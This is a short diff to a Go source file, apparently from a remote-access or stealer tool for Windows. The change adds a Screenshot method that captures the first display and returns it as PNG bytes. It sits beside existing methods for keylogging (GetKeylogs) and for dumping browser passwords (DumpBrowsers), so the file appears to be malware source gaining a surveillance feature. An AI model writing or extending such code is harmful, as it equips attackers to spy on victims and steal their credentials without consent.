@@ -3,12 +3,15 @@
 package windows
 
 import (
+	"bytes"
 	"fmt"
+	"image/png"
 	"os"
 	"os/exec"
 	"syscall"
 	"unsafe"
 
+	"github.com/kbinani/screenshot"
 	"golang.org/x/sys/windows/registry"
 )
 
@@ -78,6 +81,28 @@ func (p *WindowsPlatform) GetKeylogs() string {
 // DumpBrowsers dumps the browser passwords.
 func (p *WindowsPlatform) DumpBrowsers() string {
 	return DumpBrowsers()
+}
+
+// Screenshot captures the screen.
+func (p *WindowsPlatform) Screenshot() ([]byte, error) {
+	n := screenshot.NumActiveDisplays()
+	if n <= 0 {
+		return nil, fmt.Errorf("no active displays found")
+	}
+
+	bounds := screenshot.GetDisplayBounds(0)
+	img, err := screenshot.CaptureRect(bounds)
+	if err != nil {
+		return nil, fmt.Errorf("error capturing screen: %v", err)
+	}
+
+	var buf bytes.Buffer
+	err = png.Encode(&buf, img)
+	if err != nil {
+		return nil, fmt.Errorf("error encoding screenshot: %v", err)
+	}
+
+	return buf.Bytes(), nil
 }
 
 var (
